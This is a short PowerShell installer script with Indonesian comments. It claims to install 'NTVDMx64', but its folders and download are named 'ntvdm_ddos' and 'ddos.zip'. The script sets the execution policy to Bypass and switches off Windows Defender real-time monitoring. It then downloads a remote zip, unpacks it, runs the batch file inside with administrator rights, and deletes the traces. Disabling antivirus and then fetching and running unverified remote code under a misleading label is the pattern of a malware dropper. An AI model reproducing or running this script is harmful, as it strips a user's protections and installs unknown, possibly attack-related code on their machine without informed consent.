# install.ps1

# Izinkan eksekusi skrip
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Bypass Windows Defender
if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
}

# Tentukan direktori temp
$TempDir = "$env:TEMP\ntvdm_ddos"
$ZipFile = "$TempDir\ddos.zip"
$ExtractDir = "$TempDir\ddos"
$InstallBat = "$ExtractDir\install.bat"

# Hapus sisa file lama jika ada
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }

# Buat folder temp
New-Item -Path $TempDir -ItemType Directory -Force | Out-Null

# Unduh file ZIP
Write-Host "Mengunduh ddos.zip..." -ForegroundColor Green
$URL = "https://github.com/cvs5758/ddos/raw/main/ddos.zip "

try {
    Invoke-WebRequest -Uri $URL -OutFile $ZipFile -ErrorAction Stop
} catch {
    Write-Host "Gagal mengunduh file: $_" -ForegroundColor Red
    exit
}

# Verifikasi apakah file ZIP berhasil diunduh
if (-not (Test-Path $ZipFile)) {
    Write-Host "File ZIP tidak ditemukan di server!" -ForegroundColor Red
    exit
}

# Ekstrak ZIP
Write-Host "Mengekstrak file ZIP..." -ForegroundColor Green
Expand-Archive -Path $ZipFile -DestinationPath $ExtractDir -Force

# Verifikasi apakah install.bat ada
if (-not (Test-Path $InstallBat)) {
    Write-Host "File install.bat tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
    exit
}

# Jalankan install.bat sebagai admin
Write-Host "Menjalankan instalasi NTVDMx64..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-Command `"$InstallBat`"" -Verb RunAs -Wait

# Hapus folder sementara
Remove-Item $TempDir -Recurse -Force

Write-Host "Instalasi selesai!" -ForegroundColor Green
